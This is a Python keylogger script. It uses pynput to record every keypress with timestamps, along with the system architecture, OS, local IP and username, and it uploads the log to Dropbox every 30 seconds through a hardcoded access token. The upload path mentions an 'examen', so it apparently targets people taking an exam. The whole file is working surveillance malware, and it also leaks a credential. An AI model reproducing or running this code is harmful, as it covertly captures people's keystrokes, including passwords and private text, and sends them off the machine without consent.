from pynput.keyboard import Key, Listener
import dropbox
import time, datetime, threading, smtplib, struct, platform, socket, getpass, tempfile

architecture = struct.calcsize('P')*8
operative_system = (getattr(platform,'platform'))()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
ip_dir = s.getsockname()[0]
s.close()

username=getpass.getuser()

keys=[]
cant_press=[]
instant_ini=[]
instant_end=[]
current_average=[]
info_keys=[keys, cant_press, instant_ini, instant_end, current_average]
now = datetime.datetime.now()
now = str(now.year)+str(now.month)+str(now.day)+str(now.hour)+str(now.minute)+str(now.second)+str(now.microsecond)
name="log"+now+".txt"
filename = open(name,"w")
filename.write("arquitectura: "+str(architecture)+"\n")
filename.write("sistema operativo: "+str(operative_system)+"\n")
filename.write("direccion IP: "+str(ip_dir)+"\n")
filename.write("Nombre de usuario: "+str(username)+"\n")
filename.close()

def write_file(TIME, KEY, filename):
    with open(filename, 'a') as new_file:
        new_file.write(str(TIME))
        new_file.write(" ")
        new_file.write(str(KEY))
        new_file.write("\n")
        new_file.close()
    
def on_press(key):
    TIME = time.time()
    key_aux = str(key)
    Time=str(datetime.datetime.now())
    write_file(TIME, key, name)
    if key not in info_keys[0]:
        info_keys[0].append(key)
        info_keys[1].append(1)
        info_keys[2].append(TIME)
        info_keys[3].append(TIME)
        info_keys[4].append(0)
    else:
        for i in info_keys[0]:
            if i == key:
                position=info_keys[0].index(key)
                info_keys[1][position]=info_keys[1][position]+1
                info_keys[3][position]=TIME
                info_keys[4][position]=info_keys[1][position]/(info_keys[3][position]-info_keys[2][position])

def sendDropbox():
    now_aux = datetime.datetime.now()
    now_aux = str(now_aux.year)+str(now_aux.month)+str(now_aux.day)+str(now_aux.hour)+str(now_aux.minute)+str(now_aux.second)+str(now_aux.microsecond)
    cliente = dropbox.Dropbox('WsWjnd_jPRAAAAAAAAAAXTGJUw9ZSf6ZFsUtAdgHdtN7HSeV6qm7uRemOdRAw3Pi')
    cliente.files_upload(open("log"+now+".txt", 'rb').read(), '/examen'+now_aux+'/'+"log"+now+".txt")
    timer = threading.Timer(30, sendDropbox)
    timer.start()

def on_realese(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_realese) as listener:
    sendDropbox()
    listener.join()
